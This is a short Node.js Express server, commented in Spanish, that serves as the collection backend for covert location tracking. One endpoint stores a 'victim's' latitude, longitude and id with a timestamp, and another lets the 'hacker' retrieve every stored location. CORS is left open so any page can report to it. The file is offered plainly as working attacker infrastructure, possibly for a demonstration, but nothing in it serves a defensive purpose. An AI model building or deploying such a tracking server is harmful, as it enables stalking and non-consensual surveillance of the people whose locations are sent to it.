const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());

const dataFilePath = path.join(__dirname, 'ubicaciones.json');

// Endpoint para recibir las ubicaciones de la víctima
app.post('/api/ubicacion', (req, res) => {
    const { lat, lon, id } = req.body;
    const timestamp = new Date().toISOString();
    const nuevaUbicacion = { id, lat, lon, timestamp };

    fs.readFile(dataFilePath, 'utf8', (err, data) => {
        let ubicaciones = [];
        if (!err) {
            try {
                ubicaciones = JSON.parse(data);
            } catch (e) {
                console.error('Error al parsear el archivo JSON:', e);
            }
        }
        ubicaciones.push(nuevaUbicacion);

        fs.writeFile(dataFilePath, JSON.stringify(ubicaciones, null, 2), (err) => {
            if (err) {
                return res.status(500).send({ message: 'Error al guardar la ubicación.' });
            }
            res.status(200).send({ message: 'Ubicación recibida con éxito.' });
        });
    });
});

// Endpoint para que el "hacker" obtenga todas las ubicaciones
app.get('/api/ubicaciones', (req, res) => {
    fs.readFile(dataFilePath, 'utf8', (err, data) => {
        if (err) {
            // Si el archivo no existe, retorna un array vacío
            return res.status(200).send([]);
        }
        try {
            res.status(200).send(JSON.parse(data));
        } catch (e) {
            res.status(500).send({ message: 'Error al leer las ubicaciones.' });
        }
    });
});

app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}`);
});